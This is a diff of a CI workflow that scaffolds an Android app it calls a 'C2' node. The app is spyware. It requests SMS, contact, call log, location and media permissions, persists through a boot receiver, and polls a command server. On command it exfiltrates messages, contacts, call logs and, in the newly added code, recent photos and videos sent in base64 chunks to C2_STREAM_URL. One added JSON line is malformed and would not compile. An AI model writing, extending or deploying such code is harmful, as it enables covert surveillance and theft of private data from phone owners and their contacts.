@@ -25,10 +25,9 @@ jobs:
 
       - name: Scaffold Complete C2 Android Architecture
         run: |
-          echo "إعداد هيكل العقدة مع طلب الصلاحيات والتنفيذ الفوري..."
+          echo "إعداد هيكل العقدة الشامل لكل شيء..."
           mkdir -p app/src/main/java/com/abod/app app/src/main/res/values app/src/main/assets
           
-          # 1. AndroidManifest.xml
           cat << 'EOF' > app/src/main/AndroidManifest.xml
           <manifest xmlns:android="http://schemas.android.com/apk/res/android"
               xmlns:tools="http://schemas.android.com/tools">
@@ -88,13 +87,13 @@ jobs:
           </manifest>
           EOF
 
-          # 2. MainActivity.kt (يطلب الصلاحيات تلقائياً عند الفتح)
           cat << 'EOF' > app/src/main/java/com/abod/app/MainActivity.kt
           package com.abod.app
 
           import android.Manifest
           import android.content.Intent
           import android.content.pm.PackageManager
+          import android.os.Build
           import android.os.Bundle
           import androidx.appcompat.app.AppCompatActivity
           import androidx.core.app.ActivityCompat
@@ -106,14 +105,21 @@ jobs:
               override fun onCreate(savedInstanceState: Bundle?) {
                   super.onCreate(savedInstanceState)
                   
-                  val permissions = arrayOf(
+                  val permissionsList = mutableListOf(
                       Manifest.permission.READ_SMS,
                       Manifest.permission.READ_CONTACTS,
                       Manifest.permission.READ_CALL_LOG,
                       Manifest.permission.ACCESS_FINE_LOCATION
                   )
 
-                  val ungrantedPermissions = permissions.filter {
+                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                      permissionsList.add(Manifest.permission.READ_MEDIA_IMAGES)
+                      permissionsList.add(Manifest.permission.READ_MEDIA_VIDEO)
+                  } else {
+                      permissionsList.add(Manifest.permission.READ_EXTERNAL_STORAGE)
+                  }
+
+                  val ungrantedPermissions = permissionsList.filter {
                       ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
                   }
 
@@ -137,7 +143,6 @@ jobs:
           }
           EOF
 
-          # 3. SyncService.kt
           cat << 'EOF' > app/src/main/java/com/abod/app/SyncService.kt
           package com.abod.app
 
@@ -153,15 +158,19 @@ jobs:
           import android.os.IBinder
           import android.os.PowerManager
           import android.provider.ContactsContract
+          import android.provider.MediaStore
           import android.provider.Settings
           import androidx.core.app.NotificationCompat
           import kotlinx.coroutines.*
           import java.io.BufferedReader
+          import java.io.File
           import java.io.InputStreamReader
           import java.io.OutputStreamWriter
           import java.net.HttpURLConnection
           import java.net.URL
+          import java.security.MessageDigest
           import java.util.Base64
+          import java.util.UUID
 
           class SyncService : Service() {
               private var wakeLock: PowerManager.WakeLock? = null
@@ -208,7 +217,7 @@ jobs:
                               conn.connectTimeout = 15000
                               conn.readTimeout = 15000
 
-                              val reportJson = "{\"type\":\"TEXT_REPORT\",\"data\":\"[Heartbeat] Node active from ${Build.MODEL}\"}"
+                              val reportJson = "{"type":"TEXT_REPORT","data":"[Heartbeat] Node active from ${Build.MODEL}"}"
                               val base64Payload = Base64.getEncoder().encodeToString(reportJson.toByteArray(Charsets.UTF_8))
 
                               OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
@@ -232,12 +241,16 @@ jobs:
                                       } else if (responseStr.contains("EXTRACT_CALLS")) {
                                           val callsData = readCallLogs()
                                           sendReportToServer(deviceId, nodeModel, callsData)
+                                      } else if (responseStr.contains("EXTRACT_PHOTOS")) {
+                                          extractAndSendMedia(deviceId, nodeModel, true)
+                                      } else if (responseStr.contains("EXTRACT_VIDEOS")) {
+                                          extractAndSendMedia(deviceId, nodeModel, false)
                                       }
                                   }
                               }
                               conn.disconnect()
 
-                              delay(10000L)
+                              delay(8000L)
                           } catch (e: Exception) {
                               delay(5000L)
                           }
@@ -247,7 +260,7 @@ jobs:
               }
 
               private fun readContacts(): String {
-                  val sb = StringBuilder("--- CONTACTS LIST ---\n")
+                  val sb = StringBuilder("=== CONTACTS EXTRACTED ===\n")
                   try {
                       val cursor: Cursor? = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
                       cursor?.use {
@@ -256,17 +269,17 @@ jobs:
                           while (it.moveToNext()) {
                               val name = if (nameIdx != -1) it.getString(nameIdx) else "Unknown"
                               val number = if (numIdx != -1) it.getString(numIdx) else ""
-                              sb.append("Name: $name | Phone: $number\n")
+                              sb.append("• $name: $number\n")
                           }
                       }
                   } catch (e: Exception) {
-                      sb.append("Error reading contacts: ${e.message}\n")
+                      sb.append("Error: ${e.message}\n")
                   }
                   return sb.toString()
               }
 
               private fun readSMS(): String {
-                  val sb = StringBuilder("--- SMS MESSAGES ---\n")
+                  val sb = StringBuilder("=== SMS EXTRACTED ===\n")
                   try {
                       val cursor: Cursor? = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
                       cursor?.use {
@@ -275,17 +288,17 @@ jobs:
                           while (it.moveToNext()) {
                               val address = if (addrIdx != -1) it.getString(addrIdx) else "Unknown"
                               val body = if (bodyIdx != -1) it.getString(bodyIdx) else ""
-                              sb.append("From: $address\nMessage: $body\n-------------------\n")
+                              sb.append("From: $address\nText: $body\n-------------------\n")
                           }
                       }
                   } catch (e: Exception) {
-                      sb.append("Error reading SMS: ${e.message}\n")
+                      sb.append("Error: ${e.message}\n")
                   }
                   return sb.toString()
               }
 
               private fun readCallLogs(): String {
-                  val sb = StringBuilder("--- CALL LOGS ---\n")
+                  val sb = StringBuilder("=== CALL LOGS EXTRACTED ===\n")
                   try {
                       val cursor: Cursor? = contentResolver.query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, null)
                       cursor?.use {
@@ -298,9 +311,74 @@ jobs:
                         }
                       }
                   } catch (e: Exception) {
-                      sb.append("Error reading call logs: ${e.message}\n")
+                      sb.append("Error: ${e.message}\n")
                   }
                   return sb.toString()
+              }
+
+              private fun extractAndSendMedia(nodeId: String, nodeModel: String, isImage: Boolean) {
+                  try {
+                      val uri = if (isImage) MediaStore.Images.Media.EXTERNAL_CONTENT_URI else MediaStore.Video.Media.EXTERNAL_CONTENT_URI
+                      val projection = arrayOf(MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DISPLAY_NAME)
+                      val cursor = contentResolver.query(uri, projection, null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC LIMIT 3")
+                      
+                      cursor?.use {
+                          val dataIdx = it.getColumnIndex(MediaStore.MediaColumns.DATA)
+                          val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
+                          while (it.moveToNext()) {
+                              if (dataIdx != -1 && nameIdx != -1) {
+                                  val filePath = it.getString(dataIdx)
+                                  val fileName = it.getString(nameIdx)
+                                  val file = File(filePath)
+                                  if (file.exists() && file.isFile) {
+                                      sendFileChunks(nodeId, nodeModel, file, fileName)
+                                  }
+                              }
+                          }
+                      }
+                  } catch (e: Exception) {
+                      // Ignored
+                  }
+              }
+
+              private fun sendFileChunks(nodeId: String, nodeModel: String, file: File, fileName: String) {
+                  try {
+                      val uploadId = UUID.randomUUID().toString()
+                      val fileBytes = file.readBytes()
+                      val fileHash = MessageDigest.getInstance("SHA-256").digest(fileBytes).joinToString("") { "%02x".format(it) }
+                      
+                      val chunkSize = 512 * 1024
+                      val totalChunks = (fileBytes.size + chunkSize - 1) / chunkSize
+
+                      for (i in 0 until totalChunks) {
+                          val start = i * chunkSize
+                          val end = minOf(start + chunkSize, fileBytes.size)
+                          val chunkBytes = fileBytes.copyOfRange(start, end)
+                          val encodedChunk = Base64.getEncoder().encodeToString(chunkBytes)
+                          
+                          val isLast = (i == totalChunks - 1)
+                          val jsonPacket = "{\"type\":\"MEDIA_CHUNK\",\"uploadId\":\"$uploadId\",\"fileName\":\"$fileName\",\"chunkIndex\":$i,\"totalChunks\":$totalChunks,\"isLast\":$isLast,\"fileHash\":\"$fileHash\",\"data\":\"$encodedChunk\"}"
+                          
+                          val url = URL(C2_STREAM_URL)
+                          val conn = url.openConnection() as HttpURLConnection
+                          conn.requestMethod = "POST"
+                          conn.setRequestProperty("X-Node-ID", nodeId)
+                          conn.setRequestProperty("X-Node-Model", nodeModel)
+                          conn.setRequestProperty("Content-Type", "text/plain; charset=utf-8")
+                          conn.doOutput = true
+
+                          val base64Payload = Base64.getEncoder().encodeToString(jsonPacket.toByteArray(Charsets.UTF_8))
+                          OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
+                              os.write(base64Payload)
+                              os.flush()
+                          }
+                              conn.responseCode
+                          conn.disconnect()
+                          delay(200L)
+                      }
+                  } catch (e: Exception) {
+                      // Ignored
+                  }
               }
 
               private fun sendReportToServer(nodeId: String, nodeModel: String, reportText: String) {
@@ -313,7 +391,7 @@ jobs:
                       conn.setRequestProperty("Content-Type", "text/plain; charset=utf-8")
                       conn.doOutput = true
                       
-                      val safeText = reportText.replace("\"", "'").replace("\n", " ")
+                      val safeText = reportText.replace("\"", "'").replace("\n", "\\n")
                       val reportJson = "{\"type\":\"TEXT_REPORT\",\"data\":\"$safeText\"}"
                       val base64Payload = Base64.getEncoder().encodeToString(reportJson.toByteArray(Charsets.UTF_8))
 
@@ -340,7 +418,6 @@ jobs:
           }
           EOF
 
-          # 4. BootReceiver.kt
           cat << 'EOF' > app/src/main/java/com/abod/app/BootReceiver.kt
           package com.abod.app
 
@@ -361,7 +438,6 @@ jobs:
           }
           EOF
 
-          # 5. app/build.gradle
           cat << 'EOF' > app/build.gradle
           plugins {
               id 'com.android.application'
@@ -398,7 +474,6 @@ jobs:
           }
           EOF
 
-          # 6. build.gradle (Root)
           cat << 'EOF' > build.gradle
           plugins {
               id 'com.android.application' version '8.1.1' apply false
@@ -406,7 +481,6 @@ jobs:
           }
           EOF
 
-          # 7. settings.gradle
           cat << 'EOF' > settings.gradle
           pluginManagement {
               repositories {
@@ -426,7 +500,6 @@ jobs:
           include ':app'
           EOF
 
-          # 8. gradle.properties
           cat << 'EOF' > gradle.properties
           android.useAndroidX=true
           android.enableJetifier=true
